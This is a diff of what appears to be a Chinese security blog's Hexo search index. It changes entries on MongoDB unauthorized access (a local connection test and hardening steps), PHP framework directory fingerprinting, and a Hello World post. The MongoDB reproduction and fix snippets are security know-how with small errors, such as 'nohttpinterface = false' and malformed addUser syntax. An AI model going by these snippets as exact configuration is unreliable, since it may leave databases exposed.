+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录Mongodb控制台</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: mongod 127.0.0.1:27017</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/996ace683b6e8b7130df8cda3d0efc62.png" class>
+
+
+
+<p>登录成功后，使用语句进行查询操作，发现数据库admin没有数据，没有添加用户</p>
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3186b9e9e72cf57cf9585d9f09ddbcbe.png" class>
+
+
+
+<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1) 为 MongoDB 添加认证</p>
+<p>① MongoDB 启动时添加 -auth 参数。</p>
+<p>② 给 MongoDB 添加用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use admin \# 使用 admin 库</span><br><span class="line"></span><br><span class="line">db.addUser“用户名” “密码”\# 添加用户名、密码</span><br><span class="line"></span><br><span class="line">db.auth“用户名”,“密码”\# 验证是否添加成功返回 1 说明成功。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>(2) 禁用 HTTP 和 REST 端口</p>
+<p>MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6<br>版本以后这些接口默认关闭。MongoDB 默认会使用默认端口监听 Web 服务一般不需要通过<br>Web 方式进行远程管理建议禁用。修改配置文件或在启动时选择 -nohttpinterface 参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohttpinterface = false</span><br></pre></td></tr></table></figure>
+
+
+
+<p>(3) 限制绑定 IP</p>
+<p>启动时加入参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--bind_ip 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>或在 &#x2F;etc&#x2F;mongodb.conf 文件中添加以下内容 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind_ip = 127.0.0.1</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>Web漏洞</category>
         <category>未授权访问</category>
       </categories>
       <tags>
-        <tag>-Web漏洞 -未授权访问 -Memcached</tag>
+        <tag>-Web漏洞 -未授权访问 -MongoDB</tag>
       </tags>
   </entry>
   <entry>
@@ -1627,100 +1721,6 @@
       </categories>
       <tags>
         <tag>-内网渗透 -工具使用 -免杀处理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MongoDB未授权访问漏洞</title>
-    <url>/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>测试环境：Centos7</p>
-<p>安装前先安装依赖包</p>
-<p><strong>Red Hat&#x2F;CentOS：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install libcurl openssl</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>Ubuntu 18.04 LTS (“Bionic”)&#x2F;Debian 10 “Buster”：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl4 openssl</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>Ubuntu 16.04 LTS (“Xenial”)&#x2F;Debian 9 “Stretch”：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl3 openssl</span><br></pre></td></tr></table></figure>
-
-
-
-<p>下载MongoDB</p>
-<p>MongoDB 源码下载地址：<a href="https://www.mongodb.com/download-center/#community">https://www.mongodb.com/download-center\#community</a></p>
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1ed1e326da0b82a3ba6a9acc177ad6d1.jpg" class>
-
-
-
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/5fc344136eee4a58c0d0dcd509a488df.jpg" class>
-
-<p>MongoDB的可执行文件在bin目录下，将其添加到$PATH路径中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=\&lt;mongodb-install-directory\&gt;/bin:\$PATH</span><br></pre></td></tr></table></figure>
-
-
-
-<p>创建数据库目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mkdir -p /data/db</span><br></pre></td></tr></table></figure>
-
-
-
-<p>创建数据库存放目录和日志</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /data               //创建数据库目录</span><br><span class="line"></span><br><span class="line">sudo mkdir db    //创建日志</span><br><span class="line"></span><br><span class="line">sudo touch log</span><br></pre></td></tr></table></figure>
-
-
-
-<p>命令行中启动MongoDB服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> cd 安装路径/mongo/bin</span><br><span class="line"></span><br><span class="line">sudo ./mongod --dbpath=/data/db --   logpath=/data/logs</span><br></pre></td></tr></table></figure>
-
-
-
-<p>Mongodb启动成功</p>
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/393a5bd543d9da0ed85c0dec2efcdec4.png" class>
-
-
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录Mongodb控制台</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: mongod 127.0.0.1:27017</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/996ace683b6e8b7130df8cda3d0efc62.png" class>
-
-
-
-<p>登录成功后，使用语句进行查询操作，发现数据库admin没有数据，没有添加用户</p>
-<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3186b9e9e72cf57cf9585d9f09ddbcbe.png" class>
-
-
-
-<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1) 为 MongoDB 添加认证</p>
-<p>① MongoDB 启动时添加 -auth 参数。</p>
-<p>② 给 MongoDB 添加用户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use admin \# 使用 admin 库</span><br><span class="line"></span><br><span class="line">db.addUser“用户名” “密码”\# 添加用户名、密码</span><br><span class="line"></span><br><span class="line">db.auth“用户名”,“密码”\# 验证是否添加成功返回 1 说明成功。</span><br></pre></td></tr></table></figure>
-
-
-
-<p>(2) 禁用 HTTP 和 REST 端口</p>
-<p>MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6<br>版本以后这些接口默认关闭。MongoDB 默认会使用默认端口监听 Web 服务一般不需要通过<br>Web 方式进行远程管理建议禁用。修改配置文件或在启动时选择 -nohttpinterface 参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohttpinterface = false</span><br></pre></td></tr></table></figure>
-
-
-
-<p>(3) 限制绑定 IP</p>
-<p>启动时加入参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--bind_ip 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<p>或在 &#x2F;etc&#x2F;mongodb.conf 文件中添加以下内容 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind_ip = 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Web漏洞</category>
-        <category>未授权访问</category>
-      </categories>
-      <tags>
-        <tag>-Web漏洞 -未授权访问 -MongoDB</tag>
       </tags>
   </entry>
   <entry>
@@ -2091,40 +2091,90 @@
   <entry>
     <title>PHP框架指纹识别</title>
     <url>/2022/03/17/PHP%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</url>
-    <content><![CDATA[<h1 id="PHP框架指纹识别"><a href="#PHP框架指纹识别" class="headerlink" title="PHP框架指纹识别"></a>PHP框架指纹识别</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h2><p>Laravel 应用默认的目录结构试图为不管是大型应用还是小型应用提供一个好的起点，当然，你可以自己按照喜好重新组织应用目录结构，Laravel 对类在何处被加载没有任何限制——只要 Composer 可以自动载入它们即可。</p>
+    <content><![CDATA[<h1 id="PHP框架指纹识别"><a href="#PHP框架指纹识别" class="headerlink" title="PHP框架指纹识别"></a>PHP框架指纹识别</h1><blockquote>
+<p>在代码审计项目中，首先需要判断审计代码使用的框架，帮助我们快速定位有用的函数集，筛选不需要看的代码。目前比较主流的设计模式是MVC，即多层模型（M）、视图（V）、控制器（C），在此不多赘述，php的主流框架几乎都使用了MVC设计模式。PHP底下的开发框架目前见的比较多的有Laravel，ThinkPHP，yii等。</p>
+</blockquote>
+<h2 id="ThinkPHP框架"><a href="#ThinkPHP框架" class="headerlink" title="ThinkPHP框架"></a>ThinkPHP框架</h2><blockquote>
+<p>ThinkPHP的话需要区分版本的区别，ThinkPHP3和ThinkPHP5的目录结构。</p>
+</blockquote>
+<h3 id="ThinkPHP3"><a href="#ThinkPHP3" class="headerlink" title="ThinkPHP3"></a>ThinkPHP3</h3><p>现在基于ThinkPHP3的系统很少，还是值得了解的</p>
+<h4 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a>根目录</h4><p><strong>Application目录</strong></p>
+<p>用来存放项目中的一些重要函数集，默认是空的，但第一次访问后入口文件会自动生成</p>
+<p><strong>Public目录</strong></p>
+<p>是公共文件夹，供用户访问的，重要的函数集不能放在文件夹下</p>
+<p><strong>ThinkPHP目录</strong></p>
+<p>框架结构如下:</p>
+<img src="/2022/03/17/PHP%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/image-20220322181729704.png" class title="image-20220322181729704">
+
+<h3 id="ThinkPHP5"><a href="#ThinkPHP5" class="headerlink" title="ThinkPHP5"></a><strong>ThinkPHP5</strong></h3><blockquote>
+<p>TP5和TP3实际上差距有点大。其中在public文件下有个route.php文件，它的作用是用于php自带webserver支持，可用于快速测试，启动命令：php -S localhost:8888 router.php。而它的相关网站功能目录也需要从根目录下的index.php入手。</p>
+</blockquote>
+<p>默认结构如下：</p>
+<img src="/2022/03/17/PHP%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/image-20220322182130381.png" class title="image-20220322182130381">
+
+<h3 id="ThinkAdmin"><a href="#ThinkAdmin" class="headerlink" title="ThinkAdmin"></a>ThinkAdmin</h3><p>基于ThinkPHP6版本的ThinkAdmin</p>
+<h4 id="根目录-1"><a href="#根目录-1" class="headerlink" title="根目录"></a>根目录</h4><p><strong>App目录</strong></p>
+<p>也就是Application目录，下面会存在多个文件夹，每个文件夹代表一个应用。比如admin一般来说是后台的服务，wechat为微信应用服务，并且每个应用下面都有Controller(控制器)、Module(模型)、View(视图)、Route(路由)等</p>
+<p><strong>Config目录</strong></p>
+<p>放置一些配置文件</p>
+<p><strong>public目录</strong></p>
+<p>公共文件夹，供用户访问</p>
+<p><strong>vendor目录</strong></p>
+<p>存放第三方类库</p>
+<h2 id="Laravel框架"><a href="#Laravel框架" class="headerlink" title="Laravel框架"></a>Laravel框架</h2><p>Laravel 应用默认的目录结构试图为不管是大型应用还是小型应用提供一个好的起点，当然，你可以自己按照喜好重新组织应用目录结构，Laravel 对类在何处被加载没有任何限制——只要 Composer 可以自动载入它们即可。</p>
 <p><strong>Models****目录在哪里？</strong></p>
 <p>许多初学者都会困惑Laravel为什么没有<code>models</code>目录，我可以负责任的告诉大家，这是故意的。因为<code>models</code>这个词对不同人而言有不同的含义，容易造成歧义，有些开发者认为应用的模型指的是业务逻辑，另外一些人则认为模型指的是与关联数据库的交互。</p>
 <p>正是因为这个原因，我们默认将Eloquent的模型直接放置到<code>app</code>目录下，从而允许开发者自行选择放置的位置。</p>
-<h2 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a><strong>根目录</strong></h2><h3 id="App目录"><a href="#App目录" class="headerlink" title="App目录"></a><strong>App目录</strong></h3><p><code>app</code>目录包含了应用的核心代码，此外你为应用编写的代码绝大多数也会放到这里；</p>
-<h3 id="Bootstrap目录"><a href="#Bootstrap目录" class="headerlink" title="Bootstrap目录"></a><strong>Bootstrap目录</strong></h3><p><code>bootstrap</code>目录包含了少许文件，用于框架的启动和自动载入配置，还有一个<code>cache</code>文件夹用于包含框架为提升性能所生成的文件，如路由和服务缓存文件；</p>
-<h3 id="Config目录"><a href="#Config目录" class="headerlink" title="Config目录"></a><strong>Config目录</strong></h3><p><code>config</code>目录包含了应用所有的配置文件，建议通读一遍这些配置文件以便熟悉所有配置项；</p>
-<h3 id="Database目录"><a href="#Database目录" class="headerlink" title="Database目录"></a><strong>Database目录</strong></h3><p><code>database</code>目录包含了数据迁移及填充文件，如果你喜欢的话还可以将其作为 SQLite 数据库存放目录；</p>
-<h3 id="Public目录"><a href="#Public目录" class="headerlink" title="Public目录"></a><strong>Public目录</strong></h3><p><code>public</code>目录包含了入口文件<code>index.php</code>和前端资源文件（图片、JavaScript、CSS等）；</p>
-<h3 id="Resources目录"><a href="#Resources目录" class="headerlink" title="Resources目录"></a><strong>Resources目录</strong></h3><p><code>resources</code>目录包含了视图文件及原生资源文件（LESS、SASS、CoffeeScript），以及本地化文件；</p>
-<h3 id="Routes目录"><a href="#Routes目录" class="headerlink" title="Routes目录"></a><strong>Routes目录</strong></h3><p><code>routes</code> 目录包含了应用的所有路由定义。Laravel默认提供了三个路由文件：<code>web.php</code>、<code>api.php</code>和<code>console.php</code>。</p>
+<h3 id="根目录-2"><a href="#根目录-2" class="headerlink" title="根目录"></a><strong>根目录</strong></h3><p><strong>App目录</strong></p>
+<p><code>app</code>目录包含了应用的核心代码，此外你为应用编写的代码绝大多数也会放到这里；</p>
+<p><strong>Bootstrap目录</strong></p>
+<p><code>bootstrap</code>目录包含了少许文件，用于框架的启动和自动载入配置，还有一个<code>cache</code>文件夹用于包含框架为提升性能所生成的文件，如路由和服务缓存文件；</p>
+<p><strong>Config目录</strong></p>
+<p><code>config</code>目录包含了应用所有的配置文件，建议通读一遍这些配置文件以便熟悉所有配置项；</p>
+<p><strong>Database目录</strong></p>
+<p><code>database</code>目录包含了数据迁移及填充文件，如果你喜欢的话还可以将其作为 SQLite 数据库存放目录；</p>
+<p><strong>Public目录</strong></p>
+<p><code>public</code>目录包含了入口文件<code>index.php</code>和前端资源文件（图片、JavaScript、CSS等）；</p>
+<p><strong>Resources目录</strong></p>
+<p><code>resources</code>目录包含了视图文件及原生资源文件（LESS、SASS、CoffeeScript），以及本地化文件；</p>
+<p><strong>Routes目录</strong></p>
+<p><code>routes</code> 目录包含了应用的所有路由定义。Laravel默认提供了三个路由文件：<code>web.php</code>、<code>api.php</code>和<code>console.php</code>。</p>
 <p><code>web.php</code>文件包含的路由都会应用web中间件组，具备Session、CSRF防护以及Cookie加密功能，如果应用无需提供无状态的、RESTful风格的API，所有路由都会定义在<code>web.php</code>文件。</p>
 <p><code>api.php</code> 文件包含的路由应用了<code>api</code>中间件组，具备频率限制功能，这些路由是无状态的，所以请求通过这些路由进入应用需要通过token进行认证并且不能访问Session状态。</p>
 <p><code>console.php</code> 文件用于定义所有基于闭包的控制台命令，每个闭包都被绑定到一个控制台命令并且允许与命令行IO方法进行交互，尽管这个文件并不定义HTTP路由，但是它定义了基于控制台的应用入口（路由）。</p>
-<h3 id="Storage目录"><a href="#Storage目录" class="headerlink" title="Storage目录"></a><strong>Storage目录</strong></h3><p><code>storage</code>目录包含了编译过的Blade模板、基于文件的session、文件缓存，以及其它由框架生成的文件，该目录被细分为成<code>app</code>、<code>framework</code>和<code>logs</code>子母录，<code>app</code>目录用于存放应用要使用的文件，<code>framework</code>目录用于存放框架生成的文件和缓存，最后，<code>logs</code>目录包含应用的日志文件；</p>
+<p><strong>Storage目录</strong></p>
+<p><code>storage</code>目录包含了编译过的Blade模板、基于文件的session、文件缓存，以及其它由框架生成的文件，该目录被细分为成<code>app</code>、<code>framework</code>和<code>logs</code>子母录，<code>app</code>目录用于存放应用要使用的文件，<code>framework</code>目录用于存放框架生成的文件和缓存，最后，<code>logs</code>目录包含应用的日志文件；</p>
 <p><code>storage/app/public</code> 目录用于存储用户生成的文件，比如可以被公开访问的用户头像，要达到被访问的目的，你还需要在<code>public</code>目录下生成一个软连接 <code>storage</code> 指向这个目录。你可以通过 <code>php artisan storage:link</code> 命令生成这个软链接。</p>
-<h3 id="Tests目录"><a href="#Tests目录" class="headerlink" title="Tests目录"></a><strong>Tests目录</strong></h3><p><code>tests</code>目录包含自动化测试，其中已经提供了一个开箱即用的<a href="https://phpunit.de/">PHPUnit</a>示例；每一个测试类都要以 Test 开头，你可以通过 <code>phpunit</code> 或 <code>php vendor/bin/phpunit</code> 命令来运行测试。</p>
-<h3 id="Vendor目录"><a href="#Vendor目录" class="headerlink" title="Vendor目录"></a><strong>Vendor目录</strong></h3><p><code>vendor</code>目录包含<a href="https://getcomposer.org/">Composer</a>依赖。</p>
-<h2 id="App目录-1"><a href="#App目录-1" class="headerlink" title="App目录"></a><strong>App目录</strong></h2><p>应用的核心代码位于<code>app</code>目录下，默认情况下，该目录位于命名空间 App 下，  并且被 Composer 通过 <a href="http://www.php-fig.org/psr/psr-4/">PSR-4自动载入标准</a> 自动加载。</p>
+<p><strong>Tests目录</strong></p>
+<p><code>tests</code>目录包含自动化测试，其中已经提供了一个开箱即用的<a href="https://phpunit.de/">PHPUnit</a>示例；每一个测试类都要以 Test 开头，你可以通过 <code>phpunit</code> 或 <code>php vendor/bin/phpunit</code> 命令来运行测试。</p>
+<p><strong>Vendor目录</strong></p>
+<p><code>vendor</code>目录包含<a href="https://getcomposer.org/">Composer</a>依赖。</p>
+<h3 id="App目录"><a href="#App目录" class="headerlink" title="App目录"></a><strong>App目录</strong></h3><p>应用的核心代码位于<code>app</code>目录下，默认情况下，该目录位于命名空间 App 下，  并且被 Composer 通过 <a href="http://www.php-fig.org/psr/psr-4/">PSR-4自动载入标准</a> 自动加载。</p>
 <p><code>app</code>目录下包含多个子目录，如<code>Console</code>、<code>Http</code>、<code>Providers</code>等。<code>Console</code>和<code>Http</code>目录提供了进入应用核心的API，HTTP协议和CLI是和应用进行交互的两种机制，但实际上并不包含应用逻辑。换句话说，它们只是两个向应用发布命令的方式。<code>Console</code>目录包含了所有的Artisan命令，<code>Http</code>目录包含了控制器、中间件和请求等。</p>
 <p>其他目录将会在你通过Artisan命令make生成相应类的时候生成到<code>app</code>目录下。例如，<code>app/Jobs</code>目录直到你执行 <code>make:job</code> 命令生成任务类时才会出现在<code>app</code>目录下。</p>
 <blockquote>
 <p>注意：<code>app</code>目录中的很多类都可以通过Artisan命令生成，要查看所有有效的命令，可以在终端中运行<code>php artisan list make</code>命令。</p>
 </blockquote>
-<h3 id="Console目录"><a href="#Console目录" class="headerlink" title="Console目录"></a><strong>Console目录</strong></h3><p><code>Console</code>目录包含应用所有自定义的Artisan命令，这些命令类可以使用<code>make:command</code>命令生成。该目录下还有console核心类，在这里可以注册自定义的Artisan命令以及定义调度任务。</p>
-<h3 id="Events目录"><a href="#Events目录" class="headerlink" title="Events目录"></a><strong>Events目录</strong></h3><p>这个目录默认不存在，但是可以通过 <code>event:generate</code> 和 <code>make:event</code> 命令创建。该目录用于存放事件类。事件类用于告知应用其他部分某个事件发生并提供灵活的、解耦的处理机制。</p>
-<h3 id="Exceptions目录"><a href="#Exceptions目录" class="headerlink" title="Exceptions目录"></a><strong>Exceptions目录</strong></h3><p><code>Exceptions</code>目录包含应用的异常处理器，同时还是处理应用抛出的任何异常的好地方。如果你想要自定义异常如何记录异常或渲染，需要修改 Handler 类。</p>
-<h3 id="Http目录"><a href="#Http目录" class="headerlink" title="Http目录"></a><strong>Http目录</strong></h3><p><code>Http</code> 目录包含了控制器、中间件以及表单请求等，几乎所有进入应用的请求处理都在这里进行。</p>
-<h3 id="Jobs目录"><a href="#Jobs目录" class="headerlink" title="Jobs目录"></a><strong>Jobs目录</strong></h3><p>该目录默认不存在，可以通过执行 <code>make:job</code> 命令生成，<code>Jobs</code>目录用于存放队列任务，应用中的任务可以被队列化，也可以在当前请求生命周期内同步执行。同步执行的任务有时也被看作命令，因为它们实现了命令模式。</p>
-<h3 id="Listeners目录"><a href="#Listeners目录" class="headerlink" title="Listeners目录"></a><strong>Listeners目录</strong></h3><p>这个目录默认不存在，可以通过执行 <code>event:generate</code> 和 <code>make:listener</code> 命令创建。<code>Listeners</code>目录包含处理事件的类（事件监听器），事件监听器接收一个事件并提供对该事件发生后的响应逻辑，例如，<code>UserRegistered</code>事件可以被<code>SendWelcomeEmail</code>监听器处理。</p>
-<h3 id="Mail目录"><a href="#Mail目录" class="headerlink" title="Mail目录"></a><strong>Mail目录</strong></h3><p>这个目录默认不存在，但是可以通过执行 <code>make:mail</code> 命令生成，<code>Mail</code>目录包含邮件发送类，邮件对象允许你在一个地方封装构建邮件所需的所有业务逻辑，然后使用 <code>Mail::send</code> 方法发送邮件。</p>
-<h3 id="Notifications目录"><a href="#Notifications目录" class="headerlink" title="Notifications目录"></a><strong>Notifications目录</strong></h3><p>这个目录默认不存在，你可以通过执行 <code>make:notification</code> 命令创建， <code>Notifications</code> 目录包含应用发送的所有通知，比如事件发生通知。Laravel的通知功能将通知发送和通知驱动解耦，你可以通过邮件，也可以通过Slack、短信或者数据库发送通知。</p>
-<h3 id="Policies目录"><a href="#Policies目录" class="headerlink" title="Policies目录"></a><strong>Policies目录</strong></h3><p>这个目录默认不存在，你可以通过执行 <code>make:policy</code> 命令来创建， <code>Policies</code> 目录包含了所有的授权策略类，策略用于判断某个用户是否有权限去访问指定资源。更多详情，请查看授权文档。</p>
-<h3 id="Providers目录"><a href="#Providers目录" class="headerlink" title="Providers目录"></a><strong>Providers目录</strong></h3><p><code>Providers</code> 目录包含应用的所有服务提供者。服务提供者在启动应用过程中绑定服务到容器、注册事件以及执行其他任务以为即将到来的请求处理做准备。</p>
+<p><strong>Console目录</strong></p>
+<p><code>Console</code>目录包含应用所有自定义的Artisan命令，这些命令类可以使用<code>make:command</code>命令生成。该目录下还有console核心类，在这里可以注册自定义的Artisan命令以及定义调度任务。</p>
+<p><strong>Events目录</strong></p>
+<p>这个目录默认不存在，但是可以通过 <code>event:generate</code> 和 <code>make:event</code> 命令创建。该目录用于存放事件类。事件类用于告知应用其他部分某个事件发生并提供灵活的、解耦的处理机制。</p>
+<p><strong>Exceptions目录</strong></p>
+<p><code>Exceptions</code>目录包含应用的异常处理器，同时还是处理应用抛出的任何异常的好地方。如果你想要自定义异常如何记录异常或渲染，需要修改 Handler 类。</p>
+<p><strong>Http目录</strong></p>
+<p><code>Http</code> 目录包含了控制器、中间件以及表单请求等，几乎所有进入应用的请求处理都在这里进行。</p>
+<p><strong>Jobs目录</strong></p>
+<p>该目录默认不存在，可以通过执行 <code>make:job</code> 命令生成，<code>Jobs</code>目录用于存放队列任务，应用中的任务可以被队列化，也可以在当前请求生命周期内同步执行。同步执行的任务有时也被看作命令，因为它们实现了命令模式。</p>
+<p><strong>Listeners目录</strong></p>
+<p>这个目录默认不存在，可以通过执行 <code>event:generate</code> 和 <code>make:listener</code> 命令创建。<code>Listeners</code>目录包含处理事件的类（事件监听器），事件监听器接收一个事件并提供对该事件发生后的响应逻辑，例如，<code>UserRegistered</code>事件可以被<code>SendWelcomeEmail</code>监听器处理。</p>
+<p><strong>Mail目录</strong></p>
+<p>这个目录默认不存在，但是可以通过执行 <code>make:mail</code> 命令生成，<code>Mail</code>目录包含邮件发送类，邮件对象允许你在一个地方封装构建邮件所需的所有业务逻辑，然后使用 <code>Mail::send</code> 方法发送邮件。</p>
+<p><strong>Notifications目录</strong></p>
+<p>这个目录默认不存在，你可以通过执行 <code>make:notification</code> 命令创建， <code>Notifications</code> 目录包含应用发送的所有通知，比如事件发生通知。Laravel的通知功能将通知发送和通知驱动解耦，你可以通过邮件，也可以通过Slack、短信或者数据库发送通知。</p>
+<p><strong>Policies目录</strong></p>
+<p>这个目录默认不存在，你可以通过执行 <code>make:policy</code> 命令来创建， <code>Policies</code> 目录包含了所有的授权策略类，策略用于判断某个用户是否有权限去访问指定资源。更多详情，请查看授权文档。</p>
+<p><strong>Providers目录</strong></p>
+<p><code>Providers</code> 目录包含应用的所有服务提供者。服务提供者在启动应用过程中绑定服务到容器、注册事件以及执行其他任务以为即将到来的请求处理做准备。</p>
 <p>在新安装的Laravel应用中，该目录已经包含了一些服务提供者，你可以按需添加自己的服务提供者到该目录。</p>
 ]]></content>
       <categories>
@@ -2714,30 +2764,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2021/09/14/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>-博客测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>git用法小记</title>
     <url>/2022/01/23/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="git常用命令"><a href="#git常用命令" class="headerlink" title="git常用命令"></a>git常用命令</h1><hr>
@@ -2794,6 +2820,30 @@
       </categories>
       <tags>
         <tag>-git语法 -git仓库</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/09/14/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>-博客测试</tag>
       </tags>
   </entry>
   <entry>
@@ -3594,6 +3644,165 @@
       </tags>
   </entry>
   <entry>
+    <title>模板注入之TWIG</title>
